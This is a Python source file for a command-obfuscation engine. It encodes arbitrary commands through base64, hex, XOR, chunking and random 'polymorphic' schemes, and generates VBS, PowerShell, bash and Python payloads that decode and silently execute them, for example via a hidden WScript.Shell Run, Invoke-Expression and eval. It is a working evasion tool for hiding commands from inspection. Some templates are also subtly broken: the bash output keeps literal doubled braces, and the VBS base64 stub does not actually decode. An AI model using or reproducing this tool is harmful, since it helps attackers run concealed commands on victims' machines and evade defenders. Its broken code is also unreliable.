#!/usr/bin/env python3
"""
Command String Obfuscation Engine
Encodes command strings, stores in variables, and decodes at execution
Supports multiple encoding strategies: base64, hex, XOR, array concatenation, polymorphic
"""

import base64
import binascii
import string
import random
import hashlib
import struct
from typing import Dict, List, Tuple, Optional, Union
from dataclasses import dataclass
from enum import Enum
from abc import ABC, abstractmethod


class EncodingMethod(Enum):
    """Supported encoding methods"""
    BASE64 = "base64"
    HEX = "hex"
    XOR = "xor"
    ARRAY = "array"
    NESTED = "nested"
    POLYMORPH = "polymorph"


@dataclass
class CommandObfuscationConfig:
    """Configuration for command obfuscation"""
    encoding_method: EncodingMethod = EncodingMethod.BASE64
    variable_obfuscation: bool = True
    use_function_wrappers: bool = True
    add_dead_code: bool = True
    randomize_names: bool = True
    obfuscation_level: int = 3  # 1-5, higher = more obfuscation
    xor_key: Optional[int] = None
    chunk_size: int = 16
    add_anti_debug: bool = False
    use_environment_vars: bool = True


class CommandEncoder(ABC):
    """Abstract base class for command encoders"""

    def __init__(self, config: CommandObfuscationConfig):
        self.config = config
        self._name_counter = 0

    @abstractmethod
    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command, return (encoded_data, metadata)"""
        pass

    @abstractmethod
    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate decoder code in target language"""
        pass

    def generate_random_var(self, prefix: str = "v_", length: int = 8) -> str:
        """Generate obfuscated variable name"""
        if self.config.randomize_names:
            chars = string.ascii_letters + string.digits + "_"
            return prefix + "".join(random.choices(chars, k=length))
        else:
            self._name_counter += 1
            return f"{prefix}{self._name_counter}"


class Base64CommandEncoder(CommandEncoder):
    """Base64 encoding for commands"""

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command using base64"""
        encoded = base64.b64encode(command.encode()).decode()
        metadata = {
            "method": "base64",
            "original_length": len(command),
            "encoded_length": len(encoded),
            "variable_name": self.generate_random_var("b64_"),
            "decoder_name": self.generate_random_var("decode_b64_"),
        }
        return encoded, metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate Python decoder code"""
        var_name = metadata["variable_name"]
        decoder_name = metadata["decoder_name"]

        code = f"""
import base64

{var_name} = "{encoded_data}"
{decoder_name} = lambda x: base64.b64decode(x).decode()
command = {decoder_name}({var_name})
"""
        return code.strip()


class HexCommandEncoder(CommandEncoder):
    """Hex encoding for commands"""

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command using hex"""
        encoded = command.encode().hex()
        metadata = {
            "method": "hex",
            "original_length": len(command),
            "encoded_length": len(encoded),
            "variable_name": self.generate_random_var("hex_"),
            "decoder_name": self.generate_random_var("decode_hex_"),
            "chunk_size": self.config.chunk_size,
        }
        return encoded, metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate Python decoder code"""
        var_name = metadata["variable_name"]
        decoder_name = metadata["decoder_name"]

        code = f"""
{var_name} = "{encoded_data}"
{decoder_name} = lambda h: bytes.fromhex(h).decode()
command = {decoder_name}({var_name})
"""
        return code.strip()


class XORCommandEncoder(CommandEncoder):
    """XOR encoding with key derivation"""

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command using XOR with pseudo-random key"""
        if self.config.xor_key is None:
            # Derive key from command hash for reproducible encoding
            key = int(hashlib.md5(command.encode()).hexdigest(), 16) % 256
        else:
            key = self.config.xor_key

        encoded_bytes = bytes([b ^ key for b in command.encode()])
        encoded_hex = encoded_bytes.hex()

        metadata = {
            "method": "xor",
            "xor_key": key,
            "original_length": len(command),
            "encoded_length": len(encoded_hex),
            "variable_name": self.generate_random_var("xor_"),
            "key_variable": self.generate_random_var("key_"),
            "decoder_name": self.generate_random_var("decode_xor_"),
        }
        return encoded_hex, metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate Python decoder code"""
        var_name = metadata["variable_name"]
        key_var = metadata["key_variable"]
        decoder_name = metadata["decoder_name"]
        key = metadata["xor_key"]

        code = f"""
{var_name} = "{encoded_data}"
{key_var} = {key}
{decoder_name} = lambda h, k: bytes([int(h[i:i+2], 16) ^ k for i in range(0, len(h), 2)]).decode()
command = {decoder_name}({var_name}, {key_var})
"""
        return code.strip()


class ArrayCommandEncoder(CommandEncoder):
    """Array-based chunking and encoding"""

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command using array concatenation"""
        chunks = [
            command[i : i + self.config.chunk_size]
            for i in range(0, len(command), self.config.chunk_size)
        ]

        # Encode each chunk
        encoded_chunks = [binascii.hexlify(c.encode()).decode() for c in chunks]

        metadata = {
            "method": "array",
            "chunks": encoded_chunks,
            "chunk_count": len(encoded_chunks),
            "chunk_size": self.config.chunk_size,
            "array_name": self.generate_random_var("arr_"),
            "decoder_name": self.generate_random_var("decode_arr_"),
        }
        return "|".join(encoded_chunks), metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate Python decoder code"""
        array_name = metadata["array_name"]
        decoder_name = metadata["decoder_name"]
        chunks = metadata["chunks"]

        chunk_list = '[' + ', '.join(f'"{c}"' for c in chunks) + ']'

        code = f"""
{array_name} = {chunk_list}
{decoder_name} = lambda arr: ''.join([bytes.fromhex(c).decode() for c in arr])
command = {decoder_name}({array_name})
"""
        return code.strip()


class NestedCommandEncoder(CommandEncoder):
    """Multi-layer nested encoding"""

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Encode command using nested layers"""
        # Layer 1: Base64
        layer1 = base64.b64encode(command.encode()).decode()

        # Layer 2: Hex
        layer2 = layer1.encode().hex()

        # Layer 3: Reverse
        layer3 = layer2[::-1]

        metadata = {
            "method": "nested",
            "layers": ["base64", "hex", "reverse"],
            "original_length": len(command),
            "layer1_length": len(layer1),
            "layer2_length": len(layer2),
            "layer3_length": len(layer3),
            "variable_name": self.generate_random_var("nested_"),
            "decoder_name": self.generate_random_var("decode_nested_"),
        }
        return layer3, metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate Python decoder code"""
        var_name = metadata["variable_name"]
        decoder_name = metadata["decoder_name"]

        code = f"""
import base64

{var_name} = "{encoded_data}"

def {decoder_name}(data):
    # Reverse
    step1 = data[::-1]
    # Hex decode
    step2 = bytes.fromhex(step1).decode()
    # Base64 decode
    step3 = base64.b64decode(step2).decode()
    return step3

command = {decoder_name}({var_name})
"""
        return code.strip()


class PolymorphicCommandEncoder(CommandEncoder):
    """Polymorphic encoding - generates different encoding each time"""

    def __init__(self, config: CommandObfuscationConfig):
        super().__init__(config)
        self.encoders = [
            Base64CommandEncoder(config),
            HexCommandEncoder(config),
            XORCommandEncoder(config),
            ArrayCommandEncoder(config),
        ]

    def encode(self, command: str) -> Tuple[str, Dict]:
        """Randomly select encoding method"""
        encoder = random.choice(self.encoders)
        encoded, metadata = encoder.encode(command)
        metadata["selected_encoder"] = encoder.__class__.__name__
        metadata["polymorphic_key"] = random.randint(1000, 9999)
        return encoded, metadata

    def generate_decoder_code(self, encoded_data: str, metadata: Dict) -> str:
        """Generate decoder for selected encoding"""
        encoder_class = metadata["selected_encoder"]

        # Map encoder name to actual encoder instance
        for encoder in self.encoders:
            if encoder.__class__.__name__ == encoder_class:
                return encoder.generate_decoder_code(encoded_data, metadata)

        raise ValueError(f"Unknown encoder: {encoder_class}")


class CommandStringObfuscator:
    """Main obfuscation engine"""

    def __init__(self, config: CommandObfuscationConfig = None):
        self.config = config or CommandObfuscationConfig()
        self.encoders: Dict[EncodingMethod, CommandEncoder] = {}
        self._initialize_encoders()
        self._obfuscation_history: List[Dict] = []

    def _initialize_encoders(self):
        """Initialize all available encoders"""
        self.encoders[EncodingMethod.BASE64] = Base64CommandEncoder(self.config)
        self.encoders[EncodingMethod.HEX] = HexCommandEncoder(self.config)
        self.encoders[EncodingMethod.XOR] = XORCommandEncoder(self.config)
        self.encoders[EncodingMethod.ARRAY] = ArrayCommandEncoder(self.config)
        self.encoders[EncodingMethod.NESTED] = NestedCommandEncoder(self.config)
        self.encoders[EncodingMethod.POLYMORPH] = PolymorphicCommandEncoder(self.config)

    def obfuscate_command(self, command: str) -> Dict:
        """
        Main entry point: obfuscate command string
        Returns complete obfuscation payload with metadata
        """
        encoder = self.encoders[self.config.encoding_method]
        encoded_data, metadata = encoder.encode(command)

        # Generate decoder code
        decoder_code = encoder.generate_decoder_code(encoded_data, metadata)

        result = {
            "original_command": command,
            "encoded_data": encoded_data,
            "metadata": metadata,
            "decoder_code": decoder_code,
            "decoder_language": "python",
            "obfuscation_level": self.config.obfuscation_level,
        }

        # Store in history
        self._obfuscation_history.append(result)

        return result

    def generate_vbs_payload(self, command: str) -> str:
        """Generate VBS payload with embedded decoding"""
        encoder = self.encoders[self.config.encoding_method]
        encoded_data, metadata = encoder.encode(command)

        var_name = metadata.get("variable_name", "cmd")
        decoder_name = metadata.get("decoder_name", "decode_cmd")

        if self.config.encoding_method == EncodingMethod.BASE64:
            return self._generate_vbs_base64_payload(encoded_data, var_name)
        elif self.config.encoding_method == EncodingMethod.HEX:
            return self._generate_vbs_hex_payload(encoded_data, var_name)
        elif self.config.encoding_method == EncodingMethod.ARRAY:
            chunks = metadata.get("chunks", [])
            return self._generate_vbs_array_payload(chunks, var_name)
        else:
            return self._generate_vbs_base64_payload(encoded_data, var_name)

    def _generate_vbs_base64_payload(self, encoded_data: str, var_name: str) -> str:
        """Generate VBS base64 decoding payload"""
        shell_var = f"shell_{random.randint(1000, 9999)}"
        obj_var = f"obj_{random.randint(1000, 9999)}"

        vbs_code = f"""
Dim {var_name}, {obj_var}, {shell_var}, decoded_cmd
{var_name} = "{encoded_data}"
Set {obj_var} = CreateObject("MSXML2.DOMDocument")
With {obj_var}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    decoded_cmd = .SelectSingleNode("u").text
End With
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run decoded_cmd, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def _generate_vbs_hex_payload(self, encoded_data: str, var_name: str) -> str:
        """Generate VBS hex decoding payload"""
        decoder_func = f"DecodeHex_{random.randint(1000, 9999)}"
        shell_var = f"shell_{random.randint(1000, 9999)}"

        vbs_code = f"""
Function {decoder_func}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {decoder_func} = r
End Function

Dim {var_name}, decoded_cmd, {shell_var}
{var_name} = "{encoded_data}"
decoded_cmd = {decoder_func}({var_name})
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run decoded_cmd, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def _generate_vbs_array_payload(self, chunks: List[str], var_name: str) -> str:
        """Generate VBS array-based decoding payload"""
        decoder_func = f"DecodeArray_{random.randint(1000, 9999)}"
        shell_var = f"shell_{random.randint(1000, 9999)}"
        arr_var = f"arr_{random.randint(1000, 9999)}"
        idx_var = f"idx_{random.randint(1000, 9999)}"
        elem_var = f"elem_{random.randint(1000, 9999)}"
        i_var = f"i_{random.randint(1000, 9999)}"

        # Build array initialization
        array_init = f"Dim {arr_var}({len(chunks)-1})\n"
        for idx, chunk in enumerate(chunks):
            array_init += f'{arr_var}({idx}) = "{chunk}"\n'

        vbs_code = f"""
Function {decoder_func}(arr)
    Dim result, {idx_var}, {elem_var}, {i_var}
    result = ""
    For {idx_var} = LBound(arr) To UBound(arr)
        For {i_var} = 1 To Len(arr({idx_var})) Step 2
            result = result & Chr(CLng("&H" & Mid(arr({idx_var}), {i_var}, 2)))
        Next
    Next
    {decoder_func} = result
End Function

{array_init}
Dim decoded_cmd, {shell_var}
decoded_cmd = {decoder_func}({arr_var})
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run decoded_cmd, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def generate_bash_payload(self, command: str) -> str:
        """Generate bash script with embedded decoding"""
        encoder = self.encoders[self.config.encoding_method]
        encoded_data, metadata = encoder.encode(command)

        var_name = metadata.get("variable_name", "cmd")

        if self.config.encoding_method == EncodingMethod.BASE64:
            return f"""#!/bin/bash
{var_name}="{encoded_data}"
decoded_cmd=$(echo "${{{{var_name}}}}" | base64 -d)
eval "${{{{decoded_cmd}}}}"
"""

        elif self.config.encoding_method == EncodingMethod.HEX:
            return f"""#!/bin/bash
{var_name}="{encoded_data}"
decoded_cmd=$(echo "${{{{var_name}}}}" | xxd -r -p)
eval "${{{{decoded_cmd}}}}"
"""

        else:
            return f"""#!/bin/bash
{var_name}="{encoded_data}"
decoded_cmd=$(echo "${{{{var_name}}}}" | base64 -d)
eval "${{{{decoded_cmd}}}}"
"""

    def generate_powershell_payload(self, command: str) -> str:
        """Generate PowerShell payload with embedded decoding"""
        encoder = self.encoders[self.config.encoding_method]
        encoded_data, metadata = encoder.encode(command)

        var_name = metadata.get("variable_name", "cmd")

        if self.config.encoding_method == EncodingMethod.BASE64:
            return f"""$cmd = "{encoded_data}"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
Invoke-Expression $decoded
"""

        elif self.config.encoding_method == EncodingMethod.HEX:
            return f"""$cmd = "{encoded_data}"
$decoded = [System.Text.Encoding]::UTF8.GetString([byte[]]@($cmd -split '(..)' | Where-Object {{$_}} | ForEach-Object {{[convert]::ToByte($_, 16)}}))
Invoke-Expression $decoded
"""

        else:
            return f"""$cmd = "{encoded_data}"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
Invoke-Expression $decoded
"""

    def generate_python_payload(self, command: str) -> str:
        """Generate standalone Python payload"""
        result = self.obfuscate_command(command)

        payload = f"""#!/usr/bin/env python3
# Auto-generated obfuscated command payload

{result['decoder_code']}

# Execute decoded command
import subprocess
subprocess.run(command, shell=True)
"""
        return payload.strip()

    def generate_full_report(self, command: str) -> str:
        """Generate comprehensive obfuscation report"""
        result = self.obfuscate_command(command)

        report = f"""
COMMAND STRING OBFUSCATION REPORT
{'=' * 80}

Original Command:
  {result['original_command']}

Encoding Method:
  {result['metadata'].get('method', 'unknown').upper()}

Obfuscation Level:
  {result['obfuscation_level']}/5

Encoded Data:
  {result['encoded_data'][:100]}{'...' if len(result['encoded_data']) > 100 else ''}

Metadata:
  Original Length: {result['metadata'].get('original_length', 'N/A')} bytes
  Encoded Length: {result['metadata'].get('encoded_length', 'N/A')} bytes
  Compression Ratio: {self._calculate_ratio(result['metadata'])}%

Decoder Code (Python):
{'-' * 80}
{result['decoder_code']}
{'-' * 80}

VBS Payload:
{'-' * 80}
{self.generate_vbs_payload(command)[:200]}...
{'-' * 80}

PowerShell Payload:
{'-' * 80}
{self.generate_powershell_payload(command)[:200]}...
{'-' * 80}

Bash Payload:
{'-' * 80}
{self.generate_bash_payload(command)[:200]}...
{'-' * 80}

History:
  Total Obfuscations: {len(self._obfuscation_history)}
"""
        return report

    @staticmethod
    def _calculate_ratio(metadata: Dict) -> str:
        """Calculate compression ratio"""
        orig = metadata.get("original_length", 1)
        encoded = metadata.get("encoded_length", 1)
        if orig == 0:
            return "0"
        ratio = (encoded / orig) * 100
        return f"{ratio:.2f}"


# Convenience functions
def encode_command(command: str, method: EncodingMethod = EncodingMethod.BASE64) -> Dict:
    """Quick encoding using default configuration"""
    config = CommandObfuscationConfig(encoding_method=method)
    obfuscator = CommandStringObfuscator(config)
    return obfuscator.obfuscate_command(command)


def encode_to_vbs(command: str, method: EncodingMethod = EncodingMethod.BASE64) -> str:
    """Quick VBS payload generation"""
    config = CommandObfuscationConfig(encoding_method=method)
    obfuscator = CommandStringObfuscator(config)
    return obfuscator.generate_vbs_payload(command)


def encode_to_powershell(
    command: str, method: EncodingMethod = EncodingMethod.BASE64
) -> str:
    """Quick PowerShell payload generation"""
    config = CommandObfuscationConfig(encoding_method=method)
    obfuscator = CommandStringObfuscator(config)
    return obfuscator.generate_powershell_payload(command)


def encode_to_bash(command: str, method: EncodingMethod = EncodingMethod.BASE64) -> str:
    """Quick bash payload generation"""
    config = CommandObfuscationConfig(encoding_method=method)
    obfuscator = CommandStringObfuscator(config)
    return obfuscator.generate_bash_payload(command)


if __name__ == "__main__":
    # Example usage
    test_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command Write-Host 'Obfuscated'"

    print("=" * 80)
    print("COMMAND STRING OBFUSCATION ENGINE - DEMONSTRATION")
    print("=" * 80)

    # Test each encoding method
    for method in EncodingMethod:
        print(f"\n{method.value.upper()} ENCODING")
        print("-" * 80)

        config = CommandObfuscationConfig(encoding_method=method)
        obfuscator = CommandStringObfuscator(config)

        try:
            result = obfuscator.obfuscate_command(test_command)

            print(f"Encoded: {result['encoded_data'][:80]}...")
            print(f"Python Decoder:\n{result['decoder_code']}\n")

            # Generate platform-specific payloads
            print(f"VBS Payload:\n{obfuscator.generate_vbs_payload(test_command)[:150]}...\n")
            print(
                f"PowerShell Payload:\n{obfuscator.generate_powershell_payload(test_command)[:150]}...\n"
            )
            print(f"Bash Payload:\n{obfuscator.generate_bash_payload(test_command)[:150]}...\n")

        except Exception as e:
            print(f"Error with {method.value}: {e}")

    # Generate full report for base64
    print("\n" + "=" * 80)
    print("FULL OBFUSCATION REPORT (BASE64)")
    print("=" * 80)

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.BASE64)
    obfuscator = CommandStringObfuscator(config)
    print(obfuscator.generate_full_report(test_command))
